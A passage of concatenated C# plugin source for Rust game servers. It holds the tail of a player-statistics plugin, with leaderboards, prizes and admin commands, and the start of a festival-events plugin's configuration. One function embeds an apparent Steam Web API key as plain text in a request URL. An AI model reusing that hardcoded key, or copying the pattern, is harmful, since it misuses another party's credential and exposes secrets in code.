                                var farm = Players.OrderByDescending(x => x.Value.gather.AllGathered).Take(countReward);
                                int top = 1;
                                foreach (var item in farm)
                                {
                                    if (!PrizePlayerData.ContainsKey(item.Key))
                                    {
                                        PrizePlayerData.Add(item.Key, new List<PrizePlayer>());
                                    }
                                    var player = PrizePlayerData[item.Key];
                                    player.Add(new PrizePlayer { catType = cat, Name = item.Value.Name, value = item.Value.gather.AllGathered, top = top });
                                    config.settingsPrize.prizeFarm.Find(x => x.top == top)?.GiftPrizePlayer(item.Key.ToString());
                                    top++;
                                }
                            }
                            break;
                        }
                    case CatType.raid:
                        {
                            int countReward = config.settingsPrize.prizeRaid.Count;
                            if (countReward != 0)
                            {
                                var raid = Players.OrderByDescending(x => x.Value.explosion.AllExplosionUsed).Take(countReward);
                                int top = 1;
                                foreach (var item in raid)
                                {
                                    if (!PrizePlayerData.ContainsKey(item.Key))
                                    {
                                        PrizePlayerData.Add(item.Key, new List<PrizePlayer>());
                                    }
                                    var player = PrizePlayerData[item.Key];
                                    player.Add(new PrizePlayer { catType = cat, Name = item.Value.Name, value = item.Value.explosion.AllExplosionUsed, top = top });
                                    config.settingsPrize.prizeRaid.Find(x => x.top == top)?.GiftPrizePlayer(item.Key.ToString());
                                    top++;
                                }
                            }
                            break;
                        }
                    case CatType.killerNPC:
                        {
                            int countReward = config.settingsPrize.prizeNPCKiller.Count;
                            if (countReward != 0)
                            {
                                var killerNpc = Players.OrderByDescending(x => x.Value.pVP.KillsNpc).Take(countReward);
                                int top = 1;
                                foreach (var item in killerNpc)
                                {
                                    if (!PrizePlayerData.ContainsKey(item.Key))
                                    {
                                        PrizePlayerData.Add(item.Key, new List<PrizePlayer>());
                                    }
                                    var player = PrizePlayerData[item.Key];
                                    player.Add(new PrizePlayer { catType = cat, Name = item.Value.Name, value = item.Value.pVP.KillsNpc, top = top });
                                    config.settingsPrize.prizeNPCKiller.Find(x => x.top == top)?.GiftPrizePlayer(item.Key.ToString());
                                    top++;
                                }
                            }
                            break;
                        }
                    default:
                        break;
                }
            }
            SaveDataPrize();

        }
        private void PlayersTopOnChat()
        {
            int i = Core.Random.Range(0, 7);
            string playerstat = string.Empty;
            string langmsg = string.Empty;
            int top = 1;

            switch (i)
            {
                case 0:
                    {
                        if (config.settings.pveServerMode)
                        {
                            var playerList = Players.OrderByDescending(x => x.Value.pVP.KillsNpc).Take(5);
                            foreach (var playerInfo in playerList)
                            {
                                playerstat += $"<color=#faec84>{top}</color>. {playerInfo.Value.Name} : {playerInfo.Value.pVP.KillsNpc}\n";
                                top++;
                            }
                            langmsg = "STAT_TOP_FIVE_KILL_NPC";
                        }
                        else
                        {
                            var playerList = Players.OrderByDescending(x => x.Value.pVP.Kills).Take(5);
                            foreach (var playerInfo in playerList)
                            {
                                playerstat += $"<color=#faec84>{top}</color>. {playerInfo.Value.Name} : {playerInfo.Value.pVP.Kills}\n";
                                top++;
                            }
                            langmsg = "STAT_TOP_FIVE_KILL";
                        }                   
                        break;
                    }
                case 1:
                    {
                        var playerList = Players.OrderByDescending(x => x.Value.gather.AllGathered).Take(5);
                        foreach (var playerInfo in playerList)
                        {
                            playerstat += $"<color=#faec84>{top}</color>. {playerInfo.Value.Name} : {playerInfo.Value.gather.AllGathered.ToString("0,0", CultureInfo.InvariantCulture)}\n";
                            top++;
                        }
                        langmsg = "STAT_TOP_FIVE_FARM";
                        break;
                    }
                case 2:
                    {
                        var playerList = Players.OrderByDescending(x => x.Value.explosion.AllExplosionUsed).Take(5);
                        foreach (var playerInfo in playerList)
                        {
                            playerstat += $"<color=#faec84>{top}</color>. {playerInfo.Value.Name} : {playerInfo.Value.explosion.AllExplosionUsed}\n";
                            top++;
                        }
                        langmsg = "STAT_TOP_FIVE_EXPLOSION";
                        break;
                    }
                case 3:
                    {
                        var playerList = Players.OrderByDescending(x => x.Value.playedTime.PlayedForWipe).Take(5);
                        foreach (var playerInfo in playerList)
                        {
                            playerstat += $"<color=#faec84>{top}</color>. {playerInfo.Value.Name} : {TimeHelper.FormatTime(TimeSpan.FromMinutes(playerInfo.Value.playedTime.PlayedForWipe), 5, lang.GetServerLanguage())}\n";
                            top++;
                        }
                        langmsg = "STAT_TOP_FIVE_TIMEPLAYED";
                        break;
                    }
                case 4:
                    {
                        var playerList = Players.OrderByDescending(x => x.Value.otherStat.BuildingCrate).Take(5);
                        foreach (var playerInfo in playerList)
                        {
                            playerstat += $"<color=#faec84>{top}</color>. {playerInfo.Value.Name} : {playerInfo.Value.otherStat.BuildingCrate}\n";
                            top++;
                        }
                        langmsg = "STAT_TOP_FIVE_BUILDINGS";
                        break;
                    }
                case 5:
                    {
                        var playerList = Players.OrderByDescending(x => x.Value.Score).Take(5);
                        foreach (var playerInfo in playerList)
                        {
                            playerstat += $"<color=#faec84>{top}</color>. {playerInfo.Value.Name} : {playerInfo.Value.Score.ToString("0.0")}\n";
                            top++;
                        }
                        langmsg = "STAT_TOP_FIVE_SCORE";
                        break;
                    }
                case 6:
                    {
                        var playerList = Players.OrderByDescending(x => x.Value.harvesting.AllHarvesting).Take(5);
                        foreach (var playerInfo in playerList)
                        {
                            playerstat += $"<color=#faec84>{top}</color>. {playerInfo.Value.Name} : {playerInfo.Value.harvesting.AllHarvesting}\n";
                            top++;
                        }
                        langmsg = "STAT_TOP_FIVE_FERMER";
                        break;
                    }
            }

            foreach (BasePlayer item in BasePlayer.activePlayerList)
            {
                item.ChatMessage(GetLang(langmsg, item.UserIDString, playerstat));
            }

            timer.Once(config.settings.chatSendTopTime, PlayersTopOnChat);
        }
        public string GetLang(string LangKey, string userID = null, params object[] args)
        {
            sb?.Clear();
            if (args != null)
            {
                sb?.AppendFormat(lang.GetMessage(LangKey, this, userID), args);
                return sb?.ToString();
            }
            return lang.GetMessage(LangKey, this, userID);
        }
        #endregion

        #region ApiLoadData
        #region Classes
        public class items
        {
            public String shortName;
            public String ENdisplayName;
            public String RUdisplayName;
        }
        private class ItemDisplayName
        {
            public String ru;
            public String en;
        }
        #endregion
        private void AddDisplayName()
        {
            webrequest.Enqueue($"http://api.skyplugins.ru/api/getitemlist", "", (code, response) =>
            {
                if (code == 200)
                {
                    ItemList = JsonConvert.DeserializeObject<List<items>>(response);
                    for (int i = 0; i < ItemList.Count; i++)
                    {
                        items items = ItemList[i];
                        ItemName.Add(items.shortName, new ItemDisplayName { ru = items.RUdisplayName, en = items.ENdisplayName });
                    }
                }
            }, this);
        }
    
        void SteamAvatarAdd(string userid)
        {
            if (ImageLibrary == null)
                return;
            if (HasImage(userid))
                return;
            string url = "http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3F2959BD838BF8FB544B9A767F873457&" + "steamids=" + userid;
            webrequest.Enqueue(url, null, (code, response) =>
            {
                if (code == 200)
                {
                    string Avatar = (string)JObject.Parse(response)["response"]?["players"]?[0]?["avatarfull"];
                    AddImage(Avatar, userid);
                }
            }, this);
        }
        #endregion

        #region Help
        private Dictionary<string, int> GetCategory(PlayerInfo statInfo, int cat)
        {
            Dictionary<string, int> result = new Dictionary<string, int>();
            switch (cat)
            {
                case 0:
                    {
                        foreach (var item in statInfo.gather.GatheredTotal.Take(8))
                            result.Add(item.Key, item.Value);

                        result.Add("all", statInfo.gather.AllGathered);
                        return result;
                    }
                case 1:
                    {
                        foreach (var item in statInfo.explosion.ExplosionUsed.Take(8))
                            result.Add(item.Key, item.Value);

                        result.Add("all", statInfo.explosion.AllExplosionUsed);
                        return result;
                    }
                case 2:
                    {
                        foreach (var item in statInfo.harvesting.HarvestingList.OrderByDescending(x => x.Value).Take(9))
                            result.Add(item.Key, item.Value);

                        result.Add("all", statInfo.harvesting.AllHarvesting);
                        return result;
                    }
                default:
                    break;
            }
            return null;
        }
        private static List<KeyValuePair<ulong, PlayerInfo>> FindPlayers(string name)
        {
            var players = new List<KeyValuePair<ulong, PlayerInfo>>();

            var playersData = Players.Concat(IgnoreReservedPlayer);
            foreach (var activePlayer in playersData)
            {
                if (activePlayer.Value.Name.ToLower() == name)
                    players.Add(activePlayer);
                else if (activePlayer.Value.Name.ToLower().Contains(name))
                    players.Add(activePlayer);
            }

            return players;
        }
        private void CheckInMinute()
        {
            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                if (player == null || !player.userID.IsSteamId() || IgnoreReservedPlayer.ContainsKey(player.userID))
                    continue;
                PlayerInfo.AddPlayedTime(player.userID);
            }

            timer.Once(60f, CheckInMinute);
        }
        public static class TimeHelper
        {
            public static string FormatTime(TimeSpan time, int maxSubstr = 5, string language = "ru")
            {
                string result = string.Empty;
                switch (language)
                {
                    case "ru":
                        int i = 0;
                        if (time.Days != 0 && i < maxSubstr)
                        {
                            if (!string.IsNullOrEmpty(result))
                                result += " ";

                            result += $"{Format(time.Days, "д", "д", "д")}";
                            i++;
                        }
                        if (time.Hours != 0 && i < maxSubstr)
                        {
                            if (!string.IsNullOrEmpty(result))
                                result += " ";

                            result += $"{Format(time.Hours, "ч", "ч", "ч")}";
                            i++;
                        }
                        if (time.Minutes != 0 && i < maxSubstr)
                        {
                            if (!string.IsNullOrEmpty(result))
                                result += " ";

                            result += $"{Format(time.Minutes, "м", "м", "м")}";
                            i++;
                        }
                        if (time.Days == 0)
                        {
                            if (time.Seconds != 0 && i < maxSubstr)
                            {
                                if (!string.IsNullOrEmpty(result))
                                    result += " ";

                                result += $"{Format(time.Seconds, "с", "с", "с")}";
                                i++;
                            }
                        }
                        if (string.IsNullOrEmpty(result))
                            result = "0 секунд";
                        break;
                    default:
                        result = string.Format("{0}{1}{2}{3}",
                            time.Duration().Days > 0
                                ? $"{time.Days:0} day{(time.Days == 1 ? String.Empty : "s")}, "
                                : string.Empty,
                            time.Duration().Hours > 0
                                ? $"{time.Hours:0} hour{(time.Hours == 1 ? String.Empty : "s")}, "
                                : string.Empty,
                            time.Duration().Minutes > 0
                                ? $"{time.Minutes:0} minute{(time.Minutes == 1 ? String.Empty : "s")}, "
                                : string.Empty,
                            time.Duration().Seconds > 0
                                ? $"{time.Seconds:0} second{(time.Seconds == 1 ? String.Empty : "s")}"
                                : string.Empty);

                        if (result.EndsWith(", "))
                            result = result.Substring(0, result.Length - 2);

                        if (string.IsNullOrEmpty(result))
                            result = "0 seconds";
                        break;
                }
                return result;
            }

            private static string Format(int units, string form1, string form2, string form3)
            {
                var tmp = units % 10;

                if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9)
                    return $"{units}{form1}";

                if (tmp >= 2 && tmp <= 4)
                    return $"{units}{form2}";

                return $"{units}{form3}";
            }
        }
        Int32 GetTopScore(ulong userid)
        {
            Int32 Top = 1;
            var RaitingNumber = Players.OrderByDescending(x => x.Value.Score);

            foreach (var Data in RaitingNumber)
            {
                if (Data.Key == userid)
                    break;
                Top++;
            }
            return Top;
        }
        private string GetCorrectName(string name, int length)
        {
            string res = name;
            if (name.Length > length)
                res = name.Substring(0, length);
            return res;
        }
        private void ExplosionProgressAdd(BasePlayer player, BaseEntity entity, string shortname = "")
        {
            string WeaponName = string.IsNullOrWhiteSpace(shortname) == true ? string.Empty : shortname;
            if (entity != null)
            {
                if (prefabID2Item.TryGetValue(entity.prefabID, out WeaponName) == false)
                {
                    prefabNameItem.TryGetValue(entity.ShortPrefabName, out WeaponName);
                }
            } 

            if (!string.IsNullOrEmpty(WeaponName))
            {
                PlayerInfo Playerstat = PlayerInfo.Find(player.userID);
                if (Playerstat.explosion.ExplosionUsed.ContainsKey(WeaponName))
                {
                    Playerstat.explosion.ExplosionUsed[WeaponName]++;
                    Playerstat.explosion.AllExplosionUsed++;
                    Playerstat.Score += config.settingsScore.ExplosionScore[WeaponName];
                }
            }
        }
        private void WeaponProgressAdd(PlayerInfo player, HitInfo hitinfo, bool kill = false)
        {
            if (hitinfo == null || hitinfo.WeaponPrefab == null)
                return;
            string WeaponName = string.Empty;
            if (prefabID2Item.TryGetValue(hitinfo.WeaponPrefab.prefabID, out WeaponName) == false)
            {
                prefabNameItem.TryGetValue(hitinfo.WeaponPrefab.ShortPrefabName, out WeaponName);
            }
            if (!string.IsNullOrEmpty(WeaponName))
            {
                if (!player.weapon.WeaponUsed.ContainsKey(WeaponName))
                {
                    player.weapon.WeaponUsed.Add(WeaponName, new PlayerInfo.Weapon.WeaponInfo { Kills = kill ? 1 : 0, Headshots = hitinfo.isHeadshot ? 1 : 0 });
                }
                else
                {
                    var weapon = player.weapon.WeaponUsed[WeaponName];
                    weapon.Headshots += hitinfo.isHeadshot ? 1 : 0;
                    weapon.Shots++;
                    if (kill)
                        weapon.Kills++;
                }
            }
        }
        private void ProgressAdd(BasePlayer player, Item item, bool scoreGive = false)
        {
            PlayerInfo Playerstat = PlayerInfo.Find(player.userID);

            switch (item.info.shortname)
            {
                case "wood":
                    {
                        Playerstat.gather.GatheredTotal[item.info.shortname] += item.amount;
                        Playerstat.gather.AllGathered += item.amount;
                        if(scoreGive)
                            Playerstat.Score += config.settingsScore.GatherScore[item.info.shortname];
                        break;
                    }
                case "stones":
                    {
                        Playerstat.gather.GatheredTotal[item.info.shortname] += item.amount;
                        Playerstat.gather.AllGathered += item.amount;
                        if (scoreGive)
                            Playerstat.Score += config.settingsScore.GatherScore[item.info.shortname];
                        break;
                    }
                case "metal.ore":
                    {
                        Playerstat.gather.GatheredTotal[item.info.shortname] += item.amount;
                        Playerstat.gather.AllGathered += item.amount;
                        if (scoreGive)
                            Playerstat.Score += config.settingsScore.GatherScore[item.info.shortname];
                        break;
                    }
                case "sulfur.ore":
                    {
                        Playerstat.gather.GatheredTotal[item.info.shortname] += item.amount;
                        Playerstat.gather.AllGathered += item.amount;
                        if (scoreGive)
                            Playerstat.Score += config.settingsScore.GatherScore[item.info.shortname];
                        break;
                    }
                case "hq.metal.ore":
                    {
                        Playerstat.gather.GatheredTotal[item.info.shortname] += item.amount;
                        Playerstat.gather.AllGathered += item.amount;
                        if (scoreGive)
                            Playerstat.Score += config.settingsScore.GatherScore[item.info.shortname];
                        break;
                    }
                case "scrap":
                    {
                        Playerstat.gather.GatheredTotal[item.info.shortname] += item.amount;
                        Playerstat.gather.AllGathered += item.amount;
                        Playerstat.Score += config.settingsScore.ScrapScore;
                        break;
                    }
            }
        }
        #endregion

        #region Command
        private void ConsoleCommandOpenMenu(ConsoleSystem.Arg arg)
        {
            if (arg.Player() == null)
                return;
            if (IgnoreReservedPlayer.ContainsKey(arg.Player().userID))
            {
                PrintToChat(arg.Player(), GetLang("STAT_ADMIN_HIDE_STAT", arg.Player().UserIDString));
                return;
            }
            MainMenuStat(arg.Player());
        }
        [ConsoleCommand("stat.topuser")]
        private void CmdTestVkPlayer(ConsoleSystem.Arg arg)
        {
            if (arg == null)
                return;

            var players = arg.Player();
            if (players != null && !permission.UserHasPermission(players.UserIDString, permAdmin))
            {
                PrintToConsole(players, GetLang("STAT_CMD_1", players.UserIDString));
                return;
            }
            List<CatType> catTypes = new List<CatType> { CatType.score, CatType.killer, CatType.time, CatType.farm, CatType.raid, };
            string txt = string.Empty;
            foreach (var cat in catTypes)
            {
                switch (cat)
                {
                    case CatType.score:
                        {
                            int countReward = config.settingsPrize.prizeScore.Count;
                            if (countReward != 0)
                            {
                                var score = Players.OrderByDescending(x => x.Value.Score).Take(countReward);
                                int top = 1;
                                string infoUser = string.Empty;
                                foreach (var item in score)
                                {
                                    infoUser += $"{top}) {item.Value.Name} : {item.Value.Score}\n";
                                    top++;
                                }
                                txt += GetLang("STAT_TOP_VK_SCORE", null, countReward, infoUser);
                            }
                            break;
                        }
                    case CatType.killer:
                        {
                            int countReward = config.settingsPrize.prizeKiller.Count;
                            if (countReward != 0)
                            {
                                var killer = Players.OrderByDescending(x => x.Value.pVP.Kills).Take(countReward);
                                int top = 1;
                                string infoUser = string.Empty;
                                foreach (var item in killer)
                                {
                                    infoUser += $"{top}) {item.Value.Name} : {item.Value.pVP.Kills}\n";
                                    top++;
                                }
                                txt += GetLang("STAT_TOP_VK_KILLER", null, countReward, infoUser);
                            }
                            break;
                        }
                    case CatType.time:
                        {
                            int countReward = config.settingsPrize.prizeTime.Count;
                            if (countReward != 0)
                            {
                                var time = Players.OrderByDescending(x => x.Value.playedTime.PlayedForWipe).Take(countReward);
                                int top = 1;
                                string infoUser = string.Empty;
                                foreach (var item in time)
                                {
                                    infoUser += $"{top}) {item.Value.Name} : {TimeHelper.FormatTime(TimeSpan.FromMinutes(item.Value.playedTime.PlayedForWipe), 5)}\n";
                                    top++;
                                }
                                txt += GetLang("STAT_TOP_VK_TIME", null, countReward, infoUser);
                            }
                            break;
                        }
                    case CatType.farm:
                        {
                            int countReward = config.settingsPrize.prizeFarm.Count;
                            if (countReward != 0)
                            {
                                var farm = Players.OrderByDescending(x => x.Value.gather.AllGathered).Take(countReward);
                                int top = 1;
                                string infoUser = string.Empty;
                                foreach (var item in farm)
                                {
                                    infoUser += $"{top}) {item.Value.Name} : {item.Value.gather.AllGathered.ToString("0,0", CultureInfo.InvariantCulture)}\n";
                                    top++;
                                }
                                txt += GetLang("STAT_TOP_VK_FARM", null, countReward, infoUser);
                            }
                            break;
                        }
                    case CatType.raid:
                        {
                            int countReward = config.settingsPrize.prizeRaid.Count;
                            if (countReward != 0)
                            {
                                var raid = Players.OrderByDescending(x => x.Value.explosion.AllExplosionUsed).Take(countReward);
                                int top = 1;
                                string infoUser = string.Empty;
                                foreach (var item in raid)
                                {
                                    infoUser += $"{top}) {item.Value.Name} : {item.Value.explosion.AllExplosionUsed}\n";
                                    top++;
                                }
                                txt += GetLang("STAT_TOP_VK_RAID", null, countReward, infoUser);
                            }
                            break;
                        }
                    case CatType.killerNPC:
                        {
                            int countReward = config.settingsPrize.prizeNPCKiller.Count;
                            if (countReward != 0)
                            {
                                var killerNpc = Players.OrderByDescending(x => x.Value.pVP.KillsNpc).Take(countReward);
                                int top = 1;
                                string infoUser = string.Empty;
                                foreach (var item in killerNpc)
                                {
                                    infoUser += $"{top}) {item.Value.Name} : {item.Value.pVP.KillsNpc}\n";
                                    top++;
                                }
                                txt += GetLang("STAT_TOP_VK_KILLER_NPC", null, countReward, infoUser);
                            }
                            break;
                        }
                    default:
                        break;
                }
            }

            PrintWarning(txt);
        }
        [ConsoleCommand("stat.score")]
        void ShopMoneyGive(ConsoleSystem.Arg arg)
        {
            if (arg == null)
                return;

            var player = arg.Player();
            if (player != null && !player.IsAdmin)
            {
                PrintToConsole(player, GetLang("STAT_CMD_1", player.UserIDString));
                return;
            }

            switch (arg.Args[0])
            {
                case "give":
                    {
                        ulong userID = ulong.Parse(arg.Args[1]);
                        int score = Convert.ToInt32(arg.Args[2]);
                        PlayerInfo Player = PlayerInfo.Find(userID);
                        Player.Score += score;
                        Puts(GetLang("STAT_CMD_10", null, userID, score));
                        break;
                    }
                case "remove":
                    {
                        ulong userID = ulong.Parse(arg.Args[1]);
                        int score = Convert.ToInt32(arg.Args[2]);
                        PlayerInfo Player = PlayerInfo.Find(userID);
                        Player.Score -= score;
                        Puts(GetLang("STAT_CMD_11", null, userID, score));
                        break;
                    }
            }
        }
        [ConsoleCommand("stat.ignore")]
        private void CmdIgnorePlayer(ConsoleSystem.Arg arg)
        {
            if (arg == null)
                return;

            var player = arg.Player();
            if (player != null && !permission.UserHasPermission(player.UserIDString, permAdmin))
            {
                PrintToConsole(player, GetLang("STAT_CMD_1", player.UserIDString));
                return;
            }

            if (arg == null || arg.Args == null || arg.Args.Count() == 0)
            {
                arg.ReplyWith(GetLang("STAT_CMD_2"));
                return;
            }

            ulong steamid = 0;
            if (!UInt64.TryParse(arg.Args[1], out steamid))
            {
                var players = FindPlayers(arg.Args[1].ToLower());

                if (players.Count == 0)
                {
                    arg.ReplyWith(GetLang("STAT_CMD_3"));
                    return;
                }

                if (players.Count > 1)
                {
                    var PlayersMore = "";
                    foreach (var plr in players)
                        PlayersMore = PlayersMore + "\n" + plr.Value.Name + " - " + plr.Key;

                    arg.ReplyWith(GetLang("STAT_CMD_4", null, PlayersMore));
                    return;
                }

                steamid = players[0].Key;
            }

            string name = "";
            for (int ii = 1; ii < arg.Args.Count(); ii++)
                name += arg.Args[ii] + " ";

            name = name.Trim(' ');

            if (string.IsNullOrEmpty(name))
            {
                arg.ReplyWith(GetLang("STAT_CMD_2"));
                return;
            }

            if (!Players.ContainsKey(steamid) && !IgnoreReservedPlayer.ContainsKey(steamid))
            {
                arg.ReplyWith(GetLang("STAT_CMD_5"));
                return;
            }

            PlayerInfo playerInfo = Players.ContainsKey(steamid) ? Players[steamid] : IgnoreReservedPlayer[steamid];

            switch (arg.Args[0])
            {
                case "add":
                case "a":
                    {
                        if (IgnoreReservedPlayer.ContainsKey(steamid))
                        {
                            arg.ReplyWith(GetLang("STAT_CMD_6", null, playerInfo.Name));
                            break;
                        }
                        IgnoreReservedPlayer.Add(steamid, playerInfo);
                        Players.Remove(steamid);
                        arg.ReplyWith(GetLang("STAT_CMD_7", null, playerInfo.Name));
                        break;
                    }
                case "r":
                case "remove":
                    {
                        if (!IgnoreReservedPlayer.ContainsKey(steamid))
                        {
                            arg.ReplyWith(GetLang("STAT_CMD_8", null, playerInfo.Name));
                            break;
                        }
                        PlayerInfo info = IgnoreReservedPlayer[steamid];
                        Players.Add(steamid, info);
                        IgnoreReservedPlayer.Remove(steamid);
                        arg.ReplyWith(GetLang("STAT_CMD_9", null, playerInfo.Name));
                        break;
                    }
                default:
                    break;
            }
        }

        [ConsoleCommand("UI_HandlerStat")]
        private void CmdConsoleHandler(ConsoleSystem.Arg args)
        {
            BasePlayer player = args.Player();
            PlayerInfo playerInfo = PlayerInfo.Find(player.userID);
            if (player != null && args.HasArgs(1))
            {
                switch (args.Args[0])
                {
                    case "hidestat":
                        {
                            if (config.settings.availabilityUse && !permission.UserHasPermission(player.UserIDString, permAvailability))
                                return;
                            if (playerInfo.HidedStatistics)
                            {
                                playerInfo.HidedStatistics = false;
                            }
                            else
                                playerInfo.HidedStatistics = true;
                            ButtonHideStat(player, playerInfo);
                            break;
                        }
                    case "confirm":
                        {
                            DialogConfirmationDropStat(player);
                            break;
                        }
                    case "confirm_yes":
                        {
                            if (config.settings.dropStatUse && !permission.UserHasPermission(player.UserIDString, permReset))
                                return;
                            PlayerInfo.PlayerClearData(player.userID);
                            UserStat(player);
                            break;
                        }
                    case "changeCategory":
                        {
                            ulong target = ulong.Parse(args.Args[1]);
                            int cat = int.Parse(args.Args[2]);
                            CategoryStatUser(player, target, cat);
                            break;
                        }
                    case "ShowMoreStat":
                        {
                            ulong target = ulong.Parse(args.Args[1]);
                            int cat = int.Parse(args.Args[2]);
                            if (cat == 0)
                                OtherStatUser(player, target, 1);
                            else
                                OtherStatUser(player, target, 0);
                            break;
                        }
                    case "listplayer":
                        {
                            if (args.Args.Length > 1)
                            {
                                string Seaecher = args.Args[1].ToLower();
                                SearchPageUser(player, Seaecher);
                            }
                            else
                                SearchPageUser(player);
                            break;
                        }
                    case "GoStatPlayers":
                        {
                            ulong id = ulong.Parse(args.Args[1]);
                            UserStat(player, id);
                            break;
                        }
                    case "Page_swap":
                        {
                            int cat = int.Parse(args.Args[1]);
                            MenuButton(player, cat);
                            break;
                        }
                }
            }
        }
        #endregion
    }
}
      

// --- End of file: XDStatistics.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/IQFestivalEvents.cs ---
// --- Original Local Path: IQFestivalEvents.cs ---

﻿using Newtonsoft.Json;
using Newtonsoft.Json.Serialization;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using System;
using System.Collections;
using Oxide.Core.Plugins;
using System.Text;

namespace Oxide.Plugins
{
    [Info("IQFestivalEvents", "TopPlugin.ru", "0.0.5")]
    public class IQFestivalEvents : RustPlugin
    {
        /// <summary>
        /// Обновление 0.0.5
        /// - Поправил отлов ошибки при загрузке конфигурации
        /// - Изменил сохранение конфигурации
        /// - Изменил OnEntityDeath(BaseCombatEntity entity, HitInfo info) -> OnEntityDeath(BaseEntity entity, HitInfo info), чтобы избавиться от лишней конвертации
        /// - Изменил проверку на уничтоженный объект в OnEntityDeath
        /// - Поправил рандом
        /// - Исправил StringBuilder, теперь он не является статичным
        /// - Добавил словарь с компонентами и избавился от GetComponent 

        [PluginReference] Plugin IQChat;
        public void SendChat(string Message, BasePlayer player, ConVar.Chat.ChatChannel channel = ConVar.Chat.ChatChannel.Global)
        {
            if (IQChat)
                if (config.UIAlertUse)
                    IQChat?.Call("API_ALERT_PLAYER_UI", player, Message);
                else IQChat?.Call("API_ALERT_PLAYER", player, Message, config.CustomPrefix, config.CustomAvatar);
            else player.SendConsoleCommand("chat.add", channel, 0, Message);
        }

        #region Vars

        public enum ItemType
        {
            Item,
            Blueprint
        }

        private Dictionary<BaseEntity, EffectComponent> EffectsComponent = new Dictionary<BaseEntity, EffectComponent>();
        public Dictionary<String, Coroutine> RoutineList = new Dictionary<String, Coroutine>();
        public static IQFestivalEvents _;
        private Dictionary<String, List<BaseEntity>> EventStarted = new Dictionary<String, List<BaseEntity>>();

        private const String PermissionStartEvent = "iqfestivalevents.usestart";
        private const String PermissionStopEvent = "iqfestivalevents.usestop";
        #endregion

        #region Configuration

        private static Configuration config = new Configuration();
        private class Configuration
        {
            //[JsonProperty("IQChat : Кастомный префикс в чате")]
            [JsonProperty("IQ Chat : Custom prefix in the chat")]
            public String CustomPrefix = "[IQFestival]";
         //   [JsonProperty("IQChat : Кастомный аватар в чате(Если требуется)")]
            [JsonProperty("IQChat : Custom avatar in the chat (If required)")]
            public String CustomAvatar = "0";
         //   [JsonProperty("IQChat : Использовать UI уведомления")]
            [JsonProperty("IQChat : Use UI notifications")]
            public Boolean UIAlertUse = false;
            //[JsonProperty("Уведомление в чате о начале мероприятия (true - включено / false - выключено)")]
            [JsonProperty("Notification in the chat about the start of the event (true - enabled / false - disabled)")]
            public Boolean UseAlertPlayer = false;
           // [JsonProperty("Список мероприятий и их настройка : [Уникальное название] = Настройка")]
            [JsonProperty("List of events and their settings : [Unique name] = Setup")]
            public Dictionary<String, EventSetting> EventList = new Dictionary<String, EventSetting>();
            public class EventSetting
            {
               // [JsonProperty("Включить мероприятие (true - да/false - нет)")]
                [JsonProperty("Enable the event (true - yes/false - no)")]
                public Boolean TurnedEvent;
                //[JsonProperty("При каком онлайне запускать мероприятие (К примеру : 10 (запустится, если на сервере будет >= 10 игроков)")]
                [JsonProperty("When to launch an event online (For example: 10 (it will start if there are >= 10 players on the server)")]
                public Int32 OnlineStart = 0;   
              //  [JsonProperty("Дистанция спавна Entity у этого мероприятия (К примеру : Entity с соблюдением всех условий будет спавнится на дистанции более 5 метров друг от друга) ")]
                [JsonProperty("The distance of the spawn Entity at this event (For example: The Entity, subject to all conditions, will spawn at a distance of more than 5 meters from each other)")]
                public Int32 DistanceSpawnEntity = 5;
               // [JsonProperty("Сообщение при запуске мероприятия")]
                [JsonProperty("A message at the start of the event")]
                public String StartMessageEvent;
               // [JsonProperty("Через сколько начинать мероприятие (Циклично, т.е к примеру каждые 300 секунд)")]
                [JsonProperty("After how long to start the event (Cyclically, i.e., for example, every 300 seconds)")]
                public Int32 StartTimeEvent;
              //  [JsonProperty("Список монументов на котором спавнить ивент")]
                [JsonProperty("The list of monuments on which to compare the event")]
                public List<String> MonumentsSpawn = new List<String>();
                //[JsonProperty("Настройка Entity на мероприятии")]
                [JsonProperty("Setting up an Entity at an event")]
                public SettingEntity SettingEntitys = new SettingEntity();
                internal class SettingEntity
                {
                    //[JsonProperty("Эффект для проигрывания. Если эффект не нужен, оставьте поле пустым (если не знаете что это, не трогайте данный пункт)")]
                    [JsonProperty("Effect for playback. If the effect is not needed, leave the field empty (if you do not know what it is, do not touch this item)")]
                    public String EffectPath;
                //    [JsonProperty("Настройка количества спавна Entity")]
                    [JsonProperty("Setting the amount of Spawn Entity")]
                    public CountSetting CountSettings = new CountSetting();
                   // [JsonProperty("Shortname для спавна Entity (можно использовать несколько, они выбираются случайным образом)")]
                    [JsonProperty("Shortname for Spawn Entity (multiple can be used, they are randomly selected)")]
                    public List<String> ShortnameListEntity;
                  //  [JsonProperty("Х-урона по Entity на монументе")]
                    [JsonProperty("X-damage by Entity on the monument")]
                    public Single DamageEntity;
                    //[JsonProperty("Настройка выпадаемых предметов")]
                    [JsonProperty("Setting up drop-down items")]
                    public List<DropItems> DropItemList = new List<DropItems>();
                }

                internal class DropItems
                {
                   // [JsonProperty("Тип выпадаемого предмета : 0 - Итем, 1 - Чертеж (Не забывайте указывать Shortname в пункте ниже)")]
                    [JsonProperty("The type of item to drop out: 0 - Item, 1 - Drawing (Do not forget to specify the Shortname in the paragraph below)")]
                    public ItemType TypeItem = ItemType.Item;
                    [JsonProperty("Shortname")]
                    public String Shortname;
                    [JsonProperty("SkinID")]
                    public UInt64 SkinID;
                    //[JsonProperty("Отображаемое имя (Если оставить пустым, будет стандартное)")]
                    [JsonProperty("Display name (If left blank, it will be standard)")]
                    public String DisplayName;

                 //   [JsonProperty("Настройка выпадения предметов")]
                    [JsonProperty("Setting up the dropout of items")]
                    public DropSettings DropsSetting = new DropSettings();
                    internal class DropSettings
                    {
                     //   [JsonProperty("Настройка количества")]
                        [JsonProperty("Setting up the quantity")]
                        public CountSetting CountSettings = new CountSetting();
                        //[JsonProperty("Шанс выпадения (0.0 - 100.0)")]
                        [JsonProperty("Chance of falling out (0.0 - 100.0)")]
                        public Single RareDrop;
                    }

                    public Item CrateItem()
                    {
                        Int32 CountItem = Oxide.Core.Random.Range(DropsSetting.CountSettings.MinCount, DropsSetting.CountSettings.MaxCount);
                        if (CountItem <= 0) return null;

                        Item DropItem = null;
                        if (TypeItem == ItemType.Item)
                        {
                            DropItem = ItemManager.CreateByName(Shortname, CountItem, SkinID);
                            if (DropItem == null)
                            {///
